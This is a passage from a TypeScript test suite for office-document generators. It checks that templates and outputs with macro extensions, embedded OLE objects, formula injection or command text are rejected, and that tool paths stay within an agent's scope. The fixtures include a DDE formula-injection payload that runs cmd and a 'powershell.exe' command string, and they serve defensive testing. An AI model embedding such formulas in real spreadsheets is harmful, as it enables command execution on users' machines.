      }).toThrowError(/Input payload was tampered after approval/);

      // 3. Stripped citations
      expect(() => {
        templateSafetyService.assertUntrustedTemplateIntegrity(
          { ...input, citations: [] },
          canonicalHash,
        );
      }).toThrowError(/attempts to strip required source citations/);
    });
  });

  // ── Section 4: Generator Integration Tests ──────────────────────────

  describe('4. Generator Integration Tests with Templates', () => {
    it('generateDocx succeeds with approved template and records templatePath in artifact metadata', () => {
      const templateRelPath = 'templates/standard.docx';
      fs.writeFileSync(path.join(projectRoot, templateRelPath), createValidDocxTemplateBuffer());

      const input = createValidDocxInput();
      const result = docxGenerator.generateDocx({
        schemaVersion: 1,
        projectId: 'test-project',
        input,
        outputPath: 'artifacts/note_with_template.docx',
        templatePath: templateRelPath,
        requestId: 'req-docx-template-01',
      });

      expect(result.ok).toBe(true);
      expect(fs.existsSync(path.join(projectRoot, 'artifacts', 'note_with_template.docx'))).toBe(true);

      const art = artifactService.getArtifact(result.artifactId);
      expect(art?.metadata.templatePath).toBe(templateRelPath);
    });

    it('generateDocx fails closed when templatePath uses prohibited macro extension (.docm)', () => {
      const templateRelPath = 'templates/macro_template.docm';
      fs.writeFileSync(path.join(projectRoot, templateRelPath), createValidDocxTemplateBuffer());

      const input = createValidDocxInput();
      expect(() => {
        docxGenerator.generateDocx({
          schemaVersion: 1,
          projectId: 'test-project',
          input,
          outputPath: 'artifacts/note_fail.docx',
          templatePath: templateRelPath,
          requestId: 'req-docx-fail-01',
        });
      }).toThrowError(/TEMPLATE_SAFETY_VIOLATION/);
    });

    it('generateDocx fails closed when template contains embedded OLE active content', () => {
      const templateRelPath = 'templates/ole_template.docx';
      const docxWithOle: ZipFileInput[] = [
        { path: '[Content_Types].xml', data: '<?xml version="1.0"?><Types/>' },
        {
          path: 'word/document.xml',
          data: '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:object/></w:body></w:document>',
        },
      ];
      fs.writeFileSync(path.join(projectRoot, templateRelPath), buildZipArchive(docxWithOle));

      const input = createValidDocxInput();
      expect(() => {
        docxGenerator.generateDocx({
          schemaVersion: 1,
          projectId: 'test-project',
          input,
          outputPath: 'artifacts/note_ole_fail.docx',
          templatePath: templateRelPath,
          requestId: 'req-docx-ole-fail',
        });
      }).toThrowError(/TEMPLATE_SAFETY_VIOLATION/);
    });

    it('generateXlsx succeeds with approved template and records templatePath in artifact metadata', () => {
      const templateRelPath = 'templates/standard.xlsx';
      fs.writeFileSync(path.join(projectRoot, templateRelPath), createValidXlsxTemplateBuffer());

      const input = createValidXlsxInput();
      const result = xlsxGenerator.generateXlsx({
        schemaVersion: 1,
        projectId: 'test-project',
        input,
        outputPath: 'artifacts/sheet_with_template.xlsx',
        templatePath: templateRelPath,
        requestId: 'req-xlsx-template-01',
      });

      expect(result.ok).toBe(true);
      expect(fs.existsSync(path.join(projectRoot, 'artifacts', 'sheet_with_template.xlsx'))).toBe(true);

      const art = artifactService.getArtifact(result.artifactId);
      expect(art?.metadata.templatePath).toBe(templateRelPath);
    });

    it('generateXlsx fails closed when templatePath is macro-enabled (.xlsm)', () => {
      const templateRelPath = 'templates/macro.xlsm';
      fs.writeFileSync(path.join(projectRoot, templateRelPath), createValidXlsxTemplateBuffer());

      const input = createValidXlsxInput();
      expect(() => {
        xlsxGenerator.generateXlsx({
          schemaVersion: 1,
          projectId: 'test-project',
          input,
          outputPath: 'artifacts/sheet_fail.xlsx',
          templatePath: templateRelPath,
          requestId: 'req-xlsx-fail-01',
        });
      }).toThrowError(/TEMPLATE_SAFETY_VIOLATION/);
    });

    it('generateXlsx fails closed when template contains formula injection', () => {
      const templateRelPath = 'templates/formula_injection.xlsx';
      const xlsxWithInjection: ZipFileInput[] = [
        { path: '[Content_Types].xml', data: '<?xml version="1.0"?><Types/>' },
        {
          path: 'xl/worksheets/sheet1.xml',
          data: '<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData><row r="1"><c r="A1"><f>=cmd|\' /C calc\'!A0</f></c></row></sheetData></worksheet>',
        },
      ];
      fs.writeFileSync(path.join(projectRoot, templateRelPath), buildZipArchive(xlsxWithInjection));

      const input = createValidXlsxInput();
      expect(() => {
        xlsxGenerator.generateXlsx({
          schemaVersion: 1,
          projectId: 'test-project',
          input,
          outputPath: 'artifacts/sheet_formula_fail.xlsx',
          templatePath: templateRelPath,
          requestId: 'req-xlsx-formula-fail',
        });
      }).toThrowError(/TEMPLATE_SAFETY_VIOLATION/);
    });

    it('generatePptx succeeds with approved template and records templatePath in artifact metadata', () => {
      const templateRelPath = 'templates/standard.pptx';
      fs.writeFileSync(path.join(projectRoot, templateRelPath), createValidPptxTemplateBuffer());

      const input = createValidPptxInput();
      const result = pptxGenerator.generatePptx({
        schemaVersion: 1,
        projectId: 'test-project',
        input,
        outputPath: 'artifacts/deck_with_template.pptx',
        templatePath: templateRelPath,
        requestId: 'req-pptx-template-01',
      });

      expect(result.ok).toBe(true);
      expect(fs.existsSync(path.join(projectRoot, 'artifacts', 'deck_with_template.pptx'))).toBe(true);

      const art = artifactService.getArtifact(result.artifactId);
      expect(art?.metadata.templatePath).toBe(templateRelPath);
    });

    it('generatePptx fails closed when templatePath is macro-enabled (.pptm)', () => {
      const templateRelPath = 'templates/macro.pptm';
      fs.writeFileSync(path.join(projectRoot, templateRelPath), createValidPptxTemplateBuffer());

      const input = createValidPptxInput();
      expect(() => {
        pptxGenerator.generatePptx({
          schemaVersion: 1,
          projectId: 'test-project',
          input,
          outputPath: 'artifacts/deck_fail.pptx',
          templatePath: templateRelPath,
          requestId: 'req-pptx-fail-01',
        });
      }).toThrowError(/TEMPLATE_SAFETY_VIOLATION/);
    });

    it('generatePptx fails closed when template contains executable command pattern', () => {
      const templateRelPath = 'templates/exec.pptx';
      const pptxWithExec: ZipFileInput[] = [
        { path: '[Content_Types].xml', data: '<?xml version="1.0"?><Types/>' },
        {
          path: 'ppt/slides/slide1.xml',
          data: '<?xml version="1.0"?><p:sld xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"><p:cSld><p:spTree><p:sp><p:txBody><a:p><a:r><a:t>Execute powershell.exe</a:t></a:r></a:p></p:txBody></p:sp></p:spTree></p:cSld></p:sld>',
        },
      ];
      fs.writeFileSync(path.join(projectRoot, templateRelPath), buildZipArchive(pptxWithExec));

      const input = createValidPptxInput();
      expect(() => {
        pptxGenerator.generatePptx({
          schemaVersion: 1,
          projectId: 'test-project',
          input,
          outputPath: 'artifacts/deck_exec_fail.pptx',
          templatePath: templateRelPath,
          requestId: 'req-pptx-exec-fail',
        });
      }).toThrowError(/TEMPLATE_SAFETY_VIOLATION/);
    });
  });

  // ── Section 5: Pre-Finalization Output Package Safety ────────────────

  describe('5. Pre-Finalization Output Package Safety', () => {
    it('verifies generated DOCX, XLSX, and PPTX pass pre-finalization output safety', () => {
      const docxInput = createValidDocxInput();
      const docxResult = docxGenerator.generateDocx({
        schemaVersion: 1,
        projectId: 'test-project',
        input: docxInput,
        outputPath: 'artifacts/out_safe.docx',
        requestId: 'req-docx-out-safe',
      });
      expect(docxResult.ok).toBe(true);

      const xlsxInput = createValidXlsxInput();
      const xlsxResult = xlsxGenerator.generateXlsx({
        schemaVersion: 1,
        projectId: 'test-project',
        input: xlsxInput,
        outputPath: 'artifacts/out_safe.xlsx',
        requestId: 'req-xlsx-out-safe',
      });
      expect(xlsxResult.ok).toBe(true);

      const pptxInput = createValidPptxInput();
      const pptxResult = pptxGenerator.generatePptx({
        schemaVersion: 1,
        projectId: 'test-project',
        input: pptxInput,
        outputPath: 'artifacts/out_safe.pptx',
        requestId: 'req-pptx-out-safe',
      });
      expect(pptxResult.ok).toBe(true);

      // Verify audit events
      const events = auditService.getRecords();
      const docxOutEvent = events.find((e) => (e.data as any).event === 'OUTPUT_VALIDATED' && (e.data as any).outputPath === 'artifacts/out_safe.docx');
      const xlsxOutEvent = events.find((e) => (e.data as any).event === 'OUTPUT_VALIDATED' && (e.data as any).outputPath === 'artifacts/out_safe.xlsx');
      const pptxOutEvent = events.find((e) => (e.data as any).event === 'OUTPUT_VALIDATED' && (e.data as any).outputPath === 'artifacts/out_safe.pptx');

      expect(docxOutEvent).toBeDefined();
      expect(xlsxOutEvent).toBeDefined();
      expect(pptxOutEvent).toBeDefined();
    });

    it('rejects output packages that fail package safety before finalization', () => {
      // Mock dangerous buffer with OLE object
      const dangerousPackage = buildZipArchive([
        { path: '[Content_Types].xml', data: '<?xml version="1.0"?><Types/>' },
        { path: 'word/document.xml', data: '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:object/></w:body></w:document>' },
      ]);

      expect(() => {
        templateSafetyService.assertOutputSafety(dangerousPackage, 'docx', 'artifacts/malicious.docx', {
          runId: 'run-out-safety',
          actor: 'test_generator',
        });
      }).toThrowError(/OUTPUT_SAFETY_VIOLATION/);

      const events = auditService.getRecords();
      const rejEvent = events.find((e) => (e.data as any).event === 'OUTPUT_REJECTED');
      expect(rejEvent).toBeDefined();
      expect((rejEvent?.data as any).outputHash).toBeDefined();
    });
  });

  // ── Section 6: Tool Boundary and Scope Confinement ──────────────────

  describe('6. Tool Boundary and Scope Confinement for templatePath', () => {
    it('executeGenerateDocxTool rejects templatePath outside agent scope', () => {
      fs.writeFileSync(path.join(projectRoot, 'templates', 'standard.docx'), createValidDocxTemplateBuffer());
      const input = createValidDocxInput();

      expect(() => {
        executeGenerateDocxTool(
          {
            schemaVersion: 1,
            projectId: 'test-project',
            input,
            outputPath: 'artifacts/note.docx',
            templatePath: 'templates/standard.docx',
            requestId: 'req-scope-docx',
          },
          {
            projectRoot,
            agentId: 'report_agent',
            scope: ['artifacts'], // 'templates' is outside scope!
          },
          { docxGenerator, audit: auditService, idempotency: idempotencyStore },
        );
      }).toThrowError(/PATH_TRAVERSAL_DETECTED/);
    });

    it('executeGenerateXlsxTool rejects templatePath outside agent scope', () => {
      fs.writeFileSync(path.join(projectRoot, 'templates', 'standard.xlsx'), createValidXlsxTemplateBuffer());
      const input = createValidXlsxInput();

      expect(() => {
        executeGenerateXlsxTool(
          {
            schemaVersion: 1,
            projectId: 'test-project',
            input,
            outputPath: 'artifacts/sheet.xlsx',
            templatePath: 'templates/standard.xlsx',
            requestId: 'req-scope-xlsx',
          },
          {
            projectRoot,
            agentId: 'report_agent',
            scope: ['artifacts'],
          },
          { xlsxGenerator, audit: auditService, idempotency: idempotencyStore },
        );
      }).toThrowError(/PATH_TRAVERSAL_DETECTED/);
    });

    it('executeGeneratePptxTool rejects templatePath outside agent scope', () => {
      fs.writeFileSync(path.join(projectRoot, 'templates', 'standard.pptx'), createValidPptxTemplateBuffer());
      const input = createValidPptxInput();

      expect(() => {
        executeGeneratePptxTool(
          {
            schemaVersion: 1,
            projectId: 'test-project',
            input,
            outputPath: 'artifacts/deck.pptx',
            templatePath: 'templates/standard.pptx',
            requestId: 'req-scope-pptx',
          },
          {
            projectRoot,
            agentId: 'report_agent',
            scope: ['artifacts'],
          },
          { pptxGenerator, audit: auditService, idempotency: idempotencyStore },
        );
      }).toThrowError(/PATH_TRAVERSAL_DETECTED/);
    });

    it('dispatches tool call with valid templatePath via executeTool', () => {
      fs.writeFileSync(path.join(projectRoot, 'templates', 'standard.docx'), createValidDocxTemplateBuffer());
      const input = createValidDocxInput();

      const toolCallResult = executeTool(
        'generate_docx',
        {
          schemaVersion: 1,
          projectId: 'test-project',
          input,
          outputPath: 'artifacts/via_tool.docx',
          templatePath: 'templates/standard.docx',
          requestId: 'req-execute-tool-01',
        },
        projectRoot,
        ['artifacts', 'templates', 'docs'],
        'report_agent',
        'task-01',
        ['generate_docx'],
        { docxGenerator, audit: auditService, idempotency: idempotencyStore },
      );

      const parsed = JSON.parse(toolCallResult.result);
      expect(parsed.ok).toBe(true);
      expect(parsed.artifactId).toBeDefined();
    });
  });

  // ── Section 7: Invariants and Canary File ───────────────────────────

  describe('7. Invariants and Canary File Integrity', () => {
    it('records privacy-safe audit events containing hashes and IDs without raw prose or secrets', () => {
      const templateRelPath = 'templates/standard.docx';
      fs.writeFileSync(path.join(projectRoot, templateRelPath), createValidDocxTemplateBuffer());

      const input = createValidDocxInput();
      docxGenerator.generateDocx({
        schemaVersion: 1,
        projectId: 'test-project',
        input,
        outputPath: 'artifacts/audit_check.docx',
        templatePath: templateRelPath,
        requestId: 'req-audit-check',
      });

      const auditEvents = auditService.getRecords();
      for (const ev of auditEvents) {
        const json = JSON.stringify(ev);
        // Verify no raw prose leaked into audit logs
        expect(json).not.toContain('Calibration inspection verified against ASME Section VIII');
        expect(json).not.toContain('PSV-101 safety relief tolerance observed');
      }
    });

    it('guarantees rust/test.txt canary file hash remains strictly intact', () => {
      const canaryPath = path.resolve(process.cwd(), 'rust', 'test.txt');
      expect(fs.existsSync(canaryPath)).toBe(true);
      const canaryContent = fs.readFileSync(canaryPath);
      const actualHash = crypto.createHash('sha256').update(canaryContent).digest('hex');
      expect(actualHash).toBe(CANARY_HASH);
    });
  });
});
